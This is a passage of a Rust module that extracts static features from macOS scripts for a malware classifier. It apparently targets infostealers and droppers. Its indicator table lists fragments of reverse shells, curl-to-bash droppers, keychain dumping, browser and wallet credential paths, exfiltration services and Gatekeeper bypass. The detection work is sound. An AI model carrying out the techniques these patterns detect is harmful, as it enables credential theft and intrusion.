//! Static script features (shell / zsh / bash, AppleScript source and compiled `.scpt`, JXA,
//! JavaScript, Python, Perl, Ruby).
//!
//! The vector layout is versioned by [`SCRIPT_FEATURES_VERSION`] and described by
//! [`script_feature_names`] / [`script_feature_descriptions`]; same contract as the Mach-O layout
//! (`pb-features --kind script` prints it for the trainer). Nothing is ever executed.
//!
//! Pipeline:
//! 1. **Type detection** ([`detect_script_kind`]): `FasdUAS` magic (compiled AppleScript), shebang
//!    interpreter (`env` resolved, `osascript -l JavaScript` = JXA), file extension, then (only when
//!    neither exists) content sniffing of text files.
//! 2. **Text view**: UTF-8/ASCII as is; UTF-16 (BOM) narrowed to ASCII; compiled AppleScript reduced
//!    to its ASCII and UTF-16BE string runs (literals, `do shell script` commands, identifiers).
//!    At most [`MAX_SCRIPT_BYTES`] are analysed.
//! 3. **De-obfuscation layers**: base64 / hex blobs and `\xNN` escape runs that decode to mostly
//!    printable text are decoded (depth 2, at most [`MAX_DECODED_BYTES`] in total) and analysed
//!    together with the original text — the classic `echo <b64> | base64 -d | bash` dropper.
//! 4. **Features**: kind one-hot, lexical statistics, obfuscation measures, indicator families
//!    (case-insensitive multi-pattern counts over text + decoded layers), structural strings (URLs,
//!    IPv4, blobs) and [`HASH_BUCKETS`] hashed token unigram/bigram counts (FNV-1a), all `log2(1+n)`.

use crate::features::{is_ipv4, url_host, StructStats};
use crate::MlError;
use aho_corasick::{AhoCorasick, MatchKind};
use std::collections::{BTreeSet, HashSet};
use std::path::Path;
use std::sync::OnceLock;

/// Version of the script feature layout. Bump on any change of order, meaning or count.
pub const SCRIPT_FEATURES_VERSION: u32 = 1;
/// Bytes of a script analysed (the rest is ignored).
pub const MAX_SCRIPT_BYTES: usize = 2 * 1024 * 1024;
/// Total bytes produced by the de-obfuscation layers.
pub const MAX_DECODED_BYTES: usize = 1024 * 1024;
/// Hashed token n-gram buckets.
pub const HASH_BUCKETS: usize = 256;
/// Max tokens considered for the token features.
const MAX_TOKENS: usize = 200_000;
/// Min length of a base64 / hex run considered for decoding (and counted as a blob).
const MIN_SCRIPT_BLOB: usize = 40;
/// Max distinct tokens tracked.
const MAX_DISTINCT: usize = 50_000;
/// Tokens longer than this are replaced by a `<long>` marker for hashing.
const MAX_TOKEN_LEN: usize = 32;

/// Script language family.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum ScriptKind {
    /// `sh`, `dash`, `ksh`, `csh`, `tcsh`, `fish`, `.command`, `.tool`.
    Shell,
    /// `bash`.
    Bash,
    /// `zsh`.
    Zsh,
    /// AppleScript source.
    AppleScript,
    /// Compiled AppleScript (`FasdUAS`).
    AppleScriptCompiled,
    /// JavaScript for Automation (`osascript -l JavaScript`, `.jxa`).
    Jxa,
    /// Node / Deno / Bun / plain `.js`.
    JavaScript,
    /// Python.
    Python,
    /// Perl.
    Perl,
    /// Ruby.
    Ruby,
    /// Any other interpreter (PHP, Lua, Tcl…).
    Other,
}

impl ScriptKind {
    const ALL: [ScriptKind; 11] = [
        Self::Shell,
        Self::Bash,
        Self::Zsh,
        Self::AppleScript,
        Self::AppleScriptCompiled,
        Self::Jxa,
        Self::JavaScript,
        Self::Python,
        Self::Perl,
        Self::Ruby,
        Self::Other,
    ];

    /// Machine name.
    pub fn name(self) -> &'static str {
        match self {
            Self::Shell => "shell",
            Self::Bash => "bash",
            Self::Zsh => "zsh",
            Self::AppleScript => "applescript",
            Self::AppleScriptCompiled => "applescript_compiled",
            Self::Jxa => "jxa",
            Self::JavaScript => "javascript",
            Self::Python => "python",
            Self::Perl => "perl",
            Self::Ruby => "ruby",
            Self::Other => "other",
        }
    }

    fn comment_prefixes(self) -> &'static [&'static str] {
        match self {
            Self::AppleScript | Self::AppleScriptCompiled => &["--", "#"],
            Self::Jxa | Self::JavaScript => &["//", "/*", "*"],
            _ => &["#"],
        }
    }
}

macro_rules! define_script_features {
    ($( $id:ident => $name:literal : $doc:literal ),+ $(,)?) => {
        /// Script feature indices (before the hashed buckets), in vector order.
        #[allow(non_camel_case_types, dead_code, clippy::upper_case_acronyms)]
        #[derive(Clone, Copy, Debug, PartialEq, Eq)]
        #[repr(usize)]
        pub(crate) enum S { $($id,)+ }
        const BASE_NAMES: &[&str] = &[$($name,)+];
        const BASE_DOCS: &[&str] = &[$($doc,)+];
    };
}

define_script_features! {
    // --- kind --------------------------------------------------------------------------------------
    KindShell => "kind_shell": "sh / dash / ksh / csh / fish or .sh / .command / .tool",
    KindBash => "kind_bash": "bash",
    KindZsh => "kind_zsh": "zsh",
    KindAppleScript => "kind_applescript": "AppleScript source",
    KindAppleScriptCompiled => "kind_applescript_compiled": "compiled AppleScript (FasdUAS)",
    KindJxa => "kind_jxa": "JavaScript for Automation",
    KindJavaScript => "kind_javascript": "JavaScript (node / .js)",
    KindPython => "kind_python": "Python",
    KindPerl => "kind_perl": "Perl",
    KindRuby => "kind_ruby": "Ruby",
    KindOther => "kind_other": "other interpreter",
    KindFromSniff => "kind_from_content": "kind decided by content sniffing (no shebang, magic or known extension)",
    ShebangEnv => "shebang_env": "shebang goes through /usr/bin/env",
    ShebangNonstd => "shebang_nonstandard_path": "shebang interpreter outside /bin, /usr/bin, /usr/local/bin, /opt/homebrew/bin",
    IsUtf16 => "is_utf16": "text decoded from UTF-16",
    // --- lexical ---------------------------------------------------------------------------------
    SizeLog2 => "size_log2": "log2(1 + bytes analysed)",
    LinesLog2 => "lines_log2": "log2(1 + lines)",
    AvgLineLen => "avg_line_len": "mean line length",
    MaxLineLog2 => "max_line_len_log2": "log2(1 + longest line)",
    LongLineRatio => "long_line_ratio": "fraction of lines longer than 500 bytes",
    Entropy => "entropy": "Shannon entropy of the analysed text (bits/byte)",
    NonAsciiRatio => "non_ascii_ratio": "fraction of bytes >= 0x80",
    ControlRatio => "control_ratio": "fraction of control bytes other than tab / CR / LF",
    WhitespaceRatio => "whitespace_ratio": "fraction of whitespace bytes",
    AlphaRatio => "alpha_ratio": "fraction of ASCII letters",
    DigitRatio => "digit_ratio": "fraction of ASCII digits",
    PunctRatio => "punct_ratio": "fraction of ASCII punctuation",
    UpperRatio => "upper_ratio": "upper-case letters / letters",
    CommentLineRatio => "comment_line_ratio": "lines starting with the language's comment marker / non-blank lines",
    BlankLineRatio => "blank_line_ratio": "blank lines / lines",
    TokensLog2 => "tokens_log2": "log2(1 + tokens)",
    DistinctTokensLog2 => "distinct_tokens_log2": "log2(1 + distinct tokens)",
    DistinctRatio => "distinct_token_ratio": "distinct tokens / tokens",
    MaxTokenLog2 => "max_token_len_log2": "log2(1 + longest token)",
    AvgTokenLen => "avg_token_len": "mean token length",
    DollarBrace => "dollar_brace_log2": "log2(1 + occurrences of \"${\")",
    CmdSubst => "command_substitution_log2": "log2(1 + occurrences of \"$(\" and backticks)",
    Pipes => "pipes_log2": "log2(1 + occurrences of \"|\")",
    Semicolons => "semicolon_ratio": "\";\" / lines",
    Heredocs => "heredocs": "occurrences of \"<<\"",
    // --- obfuscation -------------------------------------------------------------------------------
    B64Blobs => "b64_blobs": "base64 runs of >= 40 characters mixing upper case, lower case and digits",
    B64MaxLog2 => "b64_max_log2": "log2(1 + longest such run)",
    HexBlobs => "hex_blobs": "runs of >= 40 hex digits",
    HexEscapes => "hex_escapes_log2": "log2(1 + \"\\xNN\" escapes)",
    OctalEscapes => "octal_escapes_log2": "log2(1 + \"\\NNN\" octal escapes)",
    UnicodeEscapes => "unicode_escapes_log2": "log2(1 + \"\\uNNNN\" escapes)",
    PercentEscapes => "percent_escapes_log2": "log2(1 + \"%NN\" escapes)",
    DecodedLayers => "decoded_layers": "de-obfuscation depth reached (0, 1 or 2)",
    DecodedLog2 => "decoded_bytes_log2": "log2(1 + bytes produced by the de-obfuscation layers)",
    DecodedHits => "decoded_indicator_hits": "indicator matches found only in decoded layers",
    // --- structural strings ---------------------------------------------------------------------
    UrlHosts => "url_hosts": "distinct hosts of http(s) URLs (capped at 1000)",
    UrlIp => "url_ip": "http(s) URLs whose host is an IPv4 literal",
    UrlNonstdPort => "url_nonstd_port": "http(s) URLs with an explicit port other than 80/443",
    Ipv4 => "ipv4": "IPv4 literals",
    // --- indicator families (counts over text + decoded layers) ---------------------------------
    IOsascript => "ind_osascript": "osascript",
    IDialog => "ind_dialog": "display dialog / display alert / choose from list",
    IHiddenAnswer => "ind_hidden_answer": "hidden answer / default answer",
    IPasswordPrompt => "ind_password_prompt": "password prompts (\"enter your password\", \"requires your password\", \"system settings\", \"to launch the application\", \"password\")",
    IDscl => "ind_dscl_authonly": "dscl, -authonly",
    IKeychain => "ind_keychain": "security find-generic-password / find-internet-password / dump-keychain / unlock-keychain / export, login.keychain, keychain-db",
    ISudoStdin => "ind_sudo_stdin": "sudo -S, | sudo",
    ICurlWget => "ind_download": "curl, wget, Invoke-WebRequest, urlopen, requests.get",
    IPipeShell => "ind_pipe_to_interpreter": "| sh, | bash, | zsh, | python, | perl, | osascript (with and without space)",
    IEvalRemote => "ind_eval_remote": "$(curl, `curl, eval \"$(curl, bash -c \"$(curl, sh -c \"$(curl, source <(curl",
    IDecode => "ind_decode": "base64 -d / --decode / -D, b64decode, atob(, xxd -r, openssl enc -d, frombase64string, unhexlify, rot13",
    IExecDynamic => "ind_dynamic_exec": "eval, exec(, compile(, __import__(, marshal.loads, run script, Function(",
    IChmodExec => "ind_chmod_exec": "chmod +x / 777 / 755 / u+x / a+x",
    IQuarantine => "ind_quarantine_removal": "com.apple.quarantine, xattr -d / -c / -r / -cr",
    ILaunchd => "ind_launchd": "launchctl, LaunchAgents, LaunchDaemons, RunAtLoad, KeepAlive, ProgramArguments",
    ILoginItems => "ind_login_items": "login item, LoginItems, sfltool, BackgroundItems",
    ICron => "ind_cron": "crontab, /etc/periodic",
    IBackground => "ind_background": "nohup, disown, setsid, screen -dm, \"&>/dev/null &\", \"> /dev/null 2>&1 &\"",
    ITmpPaths => "ind_tmp_paths": "/tmp/, /private/tmp, /var/tmp, /Users/Shared, $TMPDIR",
    IHiddenPath => "ind_hidden_tmp_path": "/tmp/., /private/tmp/., /var/tmp/., /Users/Shared/.",
    IArchive => "ind_archive": "ditto -c, zip -r, zip -q, tar -cz / czf / -czf, 7z a",
    IUpload => "ind_upload": "curl -F, --data-binary, --upload-file, -X POST, --form, requests.post, multipart/form-data",
    IExfilApi => "ind_exfil_service": "api.telegram.org, discord(app).com/api/webhooks, pastebin.com, ngrok, transfer.sh, file.io, gofile.io, webhook.site, trycloudflare",
    IBrowserData => "ind_browser_data": "Chrome / Brave / Edge / Firefox / Opera / Vivaldi / Yandex / Chromium / Arc profile paths, Login Data, Cookies, Web Data, logins.json, key4.db, Local State",
    IWallets => "ind_wallets": "Exodus, Electrum, MetaMask, Coinomi, Atomic, Ledger Live, Trezor, Binance, Guarda, wallet.dat, Phantom, Trust Wallet, wallet extension ids",
    IPersonalData => "ind_personal_data": "NoteStore.sqlite, group.com.apple.notes, Cookies.binarycookies, AddressBook, chat.db, Telegram Desktop, tdata, /Keychains",
    ISysinfo => "ind_sysinfo": "system_profiler, sw_vers, ioreg, IOPlatformUUID / SerialNumber, SPHardwareDataType, SPDisplaysDataType, whoami, hw.model",
    IVmDetect => "ind_vm_detect": "VMware, VirtualBox, VBox, Parallels, QEMU, kern.hv_vmm_present",
    IGatekeeper => "ind_gatekeeper_tcc": "spctl, master-disable, --global-disable, csrutil, tccutil, TCC.db, com.apple.TCC",
    IHideTerminal => "ind_hide_terminal": "killall Terminal, application \"Terminal\", set visible of, visible:false",
    IAppleScriptUi => "ind_applescript_ui": "System Events, keystroke, key code, click button, with administrator privileges, do shell script, tell application \"Finder\", duplicate file/folder",
    IJxa => "ind_jxa": "ObjC.import, $.NSTask, $.NSString, currentApplication, doShellScript, includeStandardAdditions, Application('System Events')",
    IPythonRisky => "ind_python_risky": "os.system, subprocess, pty.spawn, socket.socket, ctypes, urllib.request, base64.b64decode, zlib.decompress, pickle.loads, getpass",
    IJsRisky => "ind_js_risky": "child_process, execSync, String.fromCharCode, unescape(, fs.writeFileSync",
    IPerlRisky => "ind_perl_risky": "IO::Socket, MIME::Base64, decode_base64, pack(\"H*\" / pack('H*'",
    IReverseShell => "ind_reverse_shell": "/dev/tcp/, nc -e, ncat -e, bash -i, sh -i, socat, mkfifo, 0>&1",
    IUserAgent => "ind_user_agent": "Mozilla/5.0, User-Agent",
    IKillProcs => "ind_kill": "killall, pkill, kill -9, launchctl unload / remove / bootout",
    IClipboard => "ind_clipboard": "pbpaste, pbcopy, the clipboard",
    IScreenCapture => "ind_screen_capture": "screencapture",
    IHistoryWipe => "ind_history_wipe": "history -c, unset HISTFILE, HISTFILE=/dev/null, .bash_history, .zsh_history",
    ISelfDelete => "ind_self_delete": "rm \"$0\" / rm -f \"$0\" / rm -- \"$0\" / rm -rf \"$0\" / rm $0, os.remove(__file__), srm",
    IDiskImage => "ind_disk_image": "hdiutil attach / mount, installer -pkg, /Volumes/",
    IDyldInject => "ind_dyld_inject": "DYLD_INSERT_LIBRARIES, DYLD_LIBRARY_PATH",
    IDefaultsWrite => "ind_defaults_write": "defaults write (dotfiles / configuration scripts)",
    IOnionDyndns => "ind_onion_dyndns": ".onion, duckdns, no-ip., ddns.net",
    IDevNull => "ind_dev_null": "/dev/null redirections",
    ISetUmaskHidden => "ind_chflags_hidden": "chflags hidden, SetFile -a V",
}

/// Number of non-hashed features.
const N_BASE: usize = BASE_NAMES.len();

fn all_names() -> &'static [&'static str] {
    static NAMES: OnceLock<Vec<&'static str>> = OnceLock::new();
    NAMES.get_or_init(|| {
        let mut v: Vec<&'static str> = BASE_NAMES.to_vec();
        for i in 0..HASH_BUCKETS {
            v.push(Box::leak(format!("tok_{i:03}").into_boxed_str()));
        }
        v
    })
}

fn all_docs() -> &'static [&'static str] {
    static DOCS: OnceLock<Vec<&'static str>> = OnceLock::new();
    DOCS.get_or_init(|| {
        let mut v: Vec<&'static str> = BASE_DOCS.to_vec();
        v.extend(std::iter::repeat_n(
            "log2(1 + count) of the lower-cased token unigrams and bigrams hashed (FNV-1a 64, mod 256) into this bucket",
            HASH_BUCKETS,
        ));
        v
    })
}

/// Names of the script features, in vector order (the trainer's column names).
pub fn script_feature_names() -> &'static [&'static str] {
    all_names()
}

/// One-line description of every script feature, same order as [`script_feature_names`].
pub fn script_feature_descriptions() -> &'static [&'static str] {
    all_docs()
}

/// Indicator patterns (ASCII case-insensitive) → feature.
const INDICATORS: &[(&str, S)] = &[
    ("osascript", S::IOsascript),
    ("display dialog", S::IDialog),
    ("display alert", S::IDialog),
    ("choose from list", S::IDialog),
    ("hidden answer", S::IHiddenAnswer),
    ("default answer", S::IHiddenAnswer),
    ("enter your password", S::IPasswordPrompt),
    ("requires your password", S::IPasswordPrompt),
    ("system settings", S::IPasswordPrompt),
    ("to launch the application", S::IPasswordPrompt),
    ("password", S::IPasswordPrompt),
    ("dscl", S::IDscl),
    ("-authonly", S::IDscl),
    ("find-generic-password", S::IKeychain),
    ("find-internet-password", S::IKeychain),
    ("dump-keychain", S::IKeychain),
    ("unlock-keychain", S::IKeychain),
    ("security export", S::IKeychain),
    ("login.keychain", S::IKeychain),
    ("keychain-db", S::IKeychain),
    ("sudo -s", S::ISudoStdin),
    ("| sudo", S::ISudoStdin),
    ("curl ", S::ICurlWget),
    ("curl\t", S::ICurlWget),
    ("wget ", S::ICurlWget),
    ("invoke-webrequest", S::ICurlWget),
    ("urlopen(", S::ICurlWget),
    ("requests.get(", S::ICurlWget),
    ("| sh", S::IPipeShell),
    ("| bash", S::IPipeShell),
    ("| zsh", S::IPipeShell),
    ("| python", S::IPipeShell),
    ("| perl", S::IPipeShell),
    ("| osascript", S::IPipeShell),
    ("|sh", S::IPipeShell),
    ("|bash", S::IPipeShell),
    ("|zsh", S::IPipeShell),
    ("|python", S::IPipeShell),
    ("|osascript", S::IPipeShell),
    ("$(curl", S::IEvalRemote),
    ("`curl", S::IEvalRemote),
    ("eval \"$(curl", S::IEvalRemote),
    ("bash -c \"$(curl", S::IEvalRemote),
    ("sh -c \"$(curl", S::IEvalRemote),
    ("<(curl", S::IEvalRemote),
    ("base64 -d", S::IDecode),
    ("base64 --decode", S::IDecode),
    ("b64decode", S::IDecode),
    ("atob(", S::IDecode),
    ("xxd -r", S::IDecode),
    ("xxd -p -r", S::IDecode),
    ("openssl enc -d", S::IDecode),
    ("openssl base64 -d", S::IDecode),
    ("frombase64string", S::IDecode),
    ("unhexlify", S::IDecode),
    ("rot13", S::IDecode),
    ("eval ", S::IExecDynamic),
    ("eval(", S::IExecDynamic),
    ("exec(", S::IExecDynamic),
    ("compile(", S::IExecDynamic),
    ("__import__(", S::IExecDynamic),
    ("marshal.loads", S::IExecDynamic),
    ("run script", S::IExecDynamic),
    ("new function(", S::IExecDynamic),
    ("chmod +x", S::IChmodExec),
    ("chmod 777", S::IChmodExec),
    ("chmod 755", S::IChmodExec),
    ("chmod u+x", S::IChmodExec),
    ("chmod a+x", S::IChmodExec),
    ("com.apple.quarantine", S::IQuarantine),
    ("xattr -d", S::IQuarantine),
    ("xattr -c", S::IQuarantine),
    ("xattr -r", S::IQuarantine),
    ("launchctl", S::ILaunchd),
    ("launchagents", S::ILaunchd),
    ("launchdaemons", S::ILaunchd),
    ("runatload", S::ILaunchd),
    ("keepalive", S::ILaunchd),
    ("programarguments", S::ILaunchd),
    ("login item", S::ILoginItems),
    ("loginitems", S::ILoginItems),
    ("sfltool", S::ILoginItems),
    ("backgrounditems", S::ILoginItems),
    ("crontab", S::ICron),
    ("/etc/periodic", S::ICron),
    ("nohup", S::IBackground),
    ("disown", S::IBackground),
    ("setsid", S::IBackground),
    ("screen -dm", S::IBackground),
    ("&>/dev/null &", S::IBackground),
    ("> /dev/null 2>&1 &", S::IBackground),
    ("/tmp/", S::ITmpPaths),
    ("/private/tmp", S::ITmpPaths),
    ("/var/tmp", S::ITmpPaths),
    ("/users/shared", S::ITmpPaths),
    ("$tmpdir", S::ITmpPaths),
    ("/tmp/.", S::IHiddenPath),
    ("/private/tmp/.", S::IHiddenPath),
    ("/var/tmp/.", S::IHiddenPath),
    ("/users/shared/.", S::IHiddenPath),
    ("ditto -c", S::IArchive),
    ("zip -r", S::IArchive),
    ("zip -q", S::IArchive),
    ("tar -cz", S::IArchive),
    ("tar czf", S::IArchive),
    ("tar -czf", S::IArchive),
    ("7z a ", S::IArchive),
    ("curl -f ", S::IUpload),
    ("--data-binary", S::IUpload),
    ("--upload-file", S::IUpload),
    ("-x post", S::IUpload),
    ("--form ", S::IUpload),
    ("requests.post", S::IUpload),
    ("multipart/form-data", S::IUpload),
    ("api.telegram.org", S::IExfilApi),
    ("discord.com/api/webhooks", S::IExfilApi),
    ("discordapp.com/api/webhooks", S::IExfilApi),
    ("pastebin.com", S::IExfilApi),
    ("ngrok", S::IExfilApi),
    ("transfer.sh", S::IExfilApi),
    ("file.io", S::IExfilApi),
    ("gofile.io", S::IExfilApi),
    ("webhook.site", S::IExfilApi),
    ("trycloudflare", S::IExfilApi),
    ("google/chrome", S::IBrowserData),
    ("bravesoftware", S::IBrowserData),
    ("microsoft edge", S::IBrowserData),
    ("firefox/profiles", S::IBrowserData),
    ("opera software", S::IBrowserData),
    ("com.operasoftware", S::IBrowserData),
    ("vivaldi", S::IBrowserData),
    ("yandex", S::IBrowserData),
    ("chromium", S::IBrowserData),
    ("arc/user data", S::IBrowserData),
    ("login data", S::IBrowserData),
    ("cookies", S::IBrowserData),
    ("web data", S::IBrowserData),
    ("logins.json", S::IBrowserData),
    ("key4.db", S::IBrowserData),
    ("local state", S::IBrowserData),
    ("exodus", S::IWallets),
    ("electrum", S::IWallets),
    ("metamask", S::IWallets),
    ("coinomi", S::IWallets),
    ("atomic", S::IWallets),
    ("ledger live", S::IWallets),
    ("trezor", S::IWallets),
    ("binance", S::IWallets),
    ("guarda", S::IWallets),
    ("wallet.dat", S::IWallets),
    ("phantom", S::IWallets),
    ("trust wallet", S::IWallets),
    ("nkbihfbeogaeaoehlefnkodbefgpgknn", S::IWallets),
    ("bfnaelmomeimhlpmgjnjophhpkkoljpa", S::IWallets),
    ("notestore.sqlite", S::IPersonalData),
    ("group.com.apple.notes", S::IPersonalData),
    ("cookies.binarycookies", S::IPersonalData),
    ("addressbook", S::IPersonalData),
    ("chat.db", S::IPersonalData),
    ("telegram desktop", S::IPersonalData),
    ("tdata", S::IPersonalData),
    ("/keychains", S::IPersonalData),
    ("system_profiler", S::ISysinfo),
    ("sw_vers", S::ISysinfo),
    ("ioreg", S::ISysinfo),
    ("ioplatformuuid", S::ISysinfo),
    ("ioplatformserialnumber", S::ISysinfo),
    ("sphardwaredatatype", S::ISysinfo),
    ("spdisplaysdatatype", S::ISysinfo),
    ("whoami", S::ISysinfo),
    ("hw.model", S::ISysinfo),
    ("vmware", S::IVmDetect),
    ("virtualbox", S::IVmDetect),
    ("vbox", S::IVmDetect),
    ("parallels", S::IVmDetect),
    ("qemu", S::IVmDetect),
    ("kern.hv_vmm_present", S::IVmDetect),
    ("spctl", S::IGatekeeper),
    ("master-disable", S::IGatekeeper),
    ("--global-disable", S::IGatekeeper),
    ("csrutil", S::IGatekeeper),
    ("tccutil", S::IGatekeeper),
    ("tcc.db", S::IGatekeeper),
    ("com.apple.tcc", S::IGatekeeper),
    ("killall terminal", S::IHideTerminal),
    ("application \"terminal\"", S::IHideTerminal),
    ("set visible of", S::IHideTerminal),
    ("visible:false", S::IHideTerminal),
    ("system events", S::IAppleScriptUi),
    ("keystroke", S::IAppleScriptUi),
    ("key code", S::IAppleScriptUi),
    ("click button", S::IAppleScriptUi),
    ("with administrator privileges", S::IAppleScriptUi),
    ("do shell script", S::IAppleScriptUi),
    ("tell application \"finder\"", S::IAppleScriptUi),
    ("duplicate file", S::IAppleScriptUi),
    ("duplicate folder", S::IAppleScriptUi),
    ("objc.import", S::IJxa),
    ("$.nstask", S::IJxa),
    ("$.nsstring", S::IJxa),
    ("currentapplication", S::IJxa),
    ("doshellscript", S::IJxa),
    ("includestandardadditions", S::IJxa),
    ("application('system events')", S::IJxa),
    ("os.system", S::IPythonRisky),
    ("subprocess", S::IPythonRisky),
    ("pty.spawn", S::IPythonRisky),
    ("socket.socket", S::IPythonRisky),
    ("ctypes", S::IPythonRisky),
    ("urllib.request", S::IPythonRisky),
    ("base64.b64decode", S::IPythonRisky),
    ("zlib.decompress", S::IPythonRisky),
    ("pickle.loads", S::IPythonRisky),
    ("getpass", S::IPythonRisky),
    ("child_process", S::IJsRisky),
    ("execsync", S::IJsRisky),
    ("string.fromcharcode", S::IJsRisky),
    ("unescape(", S::IJsRisky),
    ("fs.writefilesync", S::IJsRisky),
    ("io::socket", S::IPerlRisky),
    ("mime::base64", S::IPerlRisky),
    ("decode_base64", S::IPerlRisky),
    ("pack(\"h*\"", S::IPerlRisky),
    ("pack('h*'", S::IPerlRisky),
    ("/dev/tcp/", S::IReverseShell),
    ("nc -e", S::IReverseShell),
    ("ncat -e", S::IReverseShell),
    ("bash -i", S::IReverseShell),
    ("sh -i", S::IReverseShell),
    ("socat ", S::IReverseShell),
    ("mkfifo", S::IReverseShell),
    ("0>&1", S::IReverseShell),
    ("mozilla/5.0", S::IUserAgent),
    ("user-agent", S::IUserAgent),
    ("killall", S::IKillProcs),
    ("pkill", S::IKillProcs),
    ("kill -9", S::IKillProcs),
    ("launchctl unload", S::IKillProcs),
    ("launchctl remove", S::IKillProcs),
    ("launchctl bootout", S::IKillProcs),
    ("pbpaste", S::IClipboard),
    ("pbcopy", S::IClipboard),
    ("the clipboard", S::IClipboard),
    ("screencapture", S::IScreenCapture),
    ("history -c", S::IHistoryWipe),
    ("unset histfile", S::IHistoryWipe),
    ("histfile=/dev/null", S::IHistoryWipe),
    (".bash_history", S::IHistoryWipe),
    (".zsh_history", S::IHistoryWipe),
    ("rm \"$0\"", S::ISelfDelete),
    ("rm -f \"$0\"", S::ISelfDelete),
    ("rm -- \"$0\"", S::ISelfDelete),
    ("rm -rf \"$0\"", S::ISelfDelete),
    ("rm $0", S::ISelfDelete),
    ("os.remove(__file__)", S::ISelfDelete),
    ("srm ", S::ISelfDelete),
    ("hdiutil attach", S::IDiskImage),
    ("hdiutil mount", S::IDiskImage),
    ("installer -pkg", S::IDiskImage),
    ("/volumes/", S::IDiskImage),
    ("dyld_insert_libraries", S::IDyldInject),
    ("dyld_library_path", S::IDyldInject),
    ("defaults write", S::IDefaultsWrite),
    (".onion", S::IOnionDyndns),
    ("duckdns", S::IOnionDyndns),
    ("no-ip.", S::IOnionDyndns),
    ("ddns.net", S::IOnionDyndns),
    ("/dev/null", S::IDevNull),
    ("chflags hidden", S::ISetUmaskHidden),
    ("setfile -a v", S::ISetUmaskHidden),
];

fn indicator_automaton() -> Option<&'static AhoCorasick> {
    static AC: OnceLock<Option<AhoCorasick>> = OnceLock::new();
    AC.get_or_init(|| {
        AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .match_kind(MatchKind::Standard)
            .build(INDICATORS.iter().map(|(p, _)| p))
            .ok()
    })
    .as_ref()
}

fn lg(n: u64) -> f32 {
    ((n as f64) + 1.0).log2() as f32
}

struct Sv(Vec<f32>);

impl Sv {
    fn set(&mut self, f: S, v: f32) {
        if let Some(slot) = self.0.get_mut(f as usize) {
            *slot = if v.is_finite() { v } else { 0.0 };
        }
    }
    fn flag(&mut self, f: S, b: bool) {
        self.set(f, if b { 1.0 } else { 0.0 });
    }
    fn count(&mut self, f: S, n: u64) {
        self.set(f, n.min(100_000) as f32);
    }
    fn log2(&mut self, f: S, n: u64) {
        self.set(f, lg(n));
    }
    fn ratio(&mut self, f: S, num: u64, den: u64) {
        self.set(
            f,
            if den > 0 {
                (num as f64 / den as f64) as f32
            } else {
                0.0
            },
        );
    }
}

// ------------------------------------------------------------------------------------------------
// Type detection
// ------------------------------------------------------------------------------------------------

/// How the kind was decided.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum KindSource {
    /// `FasdUAS` magic.
    Magic,
    /// `#!` line.
    Shebang,
    /// File extension.
    Extension,
    /// Content sniffing.
    Content,
}

/// Detected kind plus shebang details.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScriptType {
    pub kind: ScriptKind,
    pub source: KindSource,
    /// Shebang goes through `env`.
    pub env: bool,
    /// Shebang interpreter path outside the standard locations.
    pub nonstandard_path: bool,
}

fn kind_from_interpreter(name: &str, args: &[&str]) -> ScriptKind {
    let base = name.rsplit('/').next().unwrap_or(name);
    let stem = base.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    match stem {
        "sh" | "dash" | "ksh" | "mksh" | "csh" | "tcsh" | "fish" | "ash" => ScriptKind::Shell,
        "bash" => ScriptKind::Bash,
        "zsh" => ScriptKind::Zsh,
        "python" | "pythonw" | "pypy" => ScriptKind::Python,
        "perl" => ScriptKind::Perl,
        "ruby" => ScriptKind::Ruby,
        "node" | "nodejs" | "deno" | "bun" => ScriptKind::JavaScript,
        "osascript" => {
            let jxa = args
                .windows(2)
                .any(|w| w[0] == "-l" && w[1].eq_ignore_ascii_case("javascript"))
                || args.iter().any(|a| a.eq_ignore_ascii_case("-ljavascript"));
            if jxa {
                ScriptKind::Jxa
            } else {
                ScriptKind::AppleScript
            }
        }
        _ => ScriptKind::Other,
    }
}

fn parse_shebang(text: &[u8]) -> Option<ScriptType> {
    let rest = text.strip_prefix(b"#!")?;
    let line_end = rest
        .iter()
        .position(|&b| b == b'\n' || b == b'\r')
        .unwrap_or(rest.len().min(256));
    let line = String::from_utf8_lossy(&rest[..line_end.min(256)]).into_owned();
    let parts: Vec<&str> = line.split_whitespace().collect();
    let interp = *parts.first()?;
    let mut env = false;
    let (name, args): (&str, Vec<&str>) = if interp.rsplit('/').next() == Some("env") {
        env = true;
        let mut it = parts[1..]
            .iter()
            .copied()
            .skip_while(|a| a.starts_with('-') || a.contains('='));
        let n = it.next()?;
        (n, it.collect())
    } else {
        (interp, parts[1..].to_vec())
    };
    let standard = [
        "/bin/",
        "/usr/bin/",
        "/usr/local/bin/",
        "/opt/homebrew/bin/",
    ];
    let nonstandard_path = !standard.iter().any(|p| {
        interp
            .strip_prefix(p)
            .is_some_and(|rest| !rest.contains('/'))
    });
    Some(ScriptType {
        kind: kind_from_interpreter(name, &args),
        source: KindSource::Shebang,
        env,
        nonstandard_path,
    })
}

fn kind_from_extension(path: &Path) -> Option<ScriptKind> {
    let ext = path.extension()?.to_str()?.to_ascii_lowercase();
    Some(match ext.as_str() {
        "sh" | "command" | "tool" | "ksh" | "csh" | "fish" => ScriptKind::Shell,
        "bash" => ScriptKind::Bash,
        "zsh" => ScriptKind::Zsh,
        "applescript" | "scpt" => ScriptKind::AppleScript,
        "jxa" => ScriptKind::Jxa,
        "js" | "mjs" | "cjs" => ScriptKind::JavaScript,
        "py" | "pyw" => ScriptKind::Python,
        "pl" | "pm" => ScriptKind::Perl,
        "rb" => ScriptKind::Ruby,
        "php" | "lua" | "tcl" => ScriptKind::Other,
        _ => return None,
    })
}

/// Mostly-text check on the head: no NUL, >= 90 % printable / whitespace / UTF-8 bytes.
fn looks_like_text(head: &[u8]) -> bool {
    if head.is_empty() || head.contains(&0) {
        return false;
    }
    let ok = head
        .iter()
        .filter(|&&b| b >= 0x20 || matches!(b, b'\t' | b'\n' | b'\r'))
        .count();
    ok * 10 >= head.len() * 9
}

fn sniff_kind(text: &[u8]) -> Option<ScriptKind> {
    let head = &text[..text.len().min(8192)];
    if !looks_like_text(head) {
        return None;
    }
    let lower = head.to_ascii_lowercase();
    let has = |n: &[u8]| lower.windows(n.len()).any(|w| w == n);
    if has(b"objc.import") || has(b"application(\"") || has(b"application('") {
        return Some(ScriptKind::Jxa);
    }
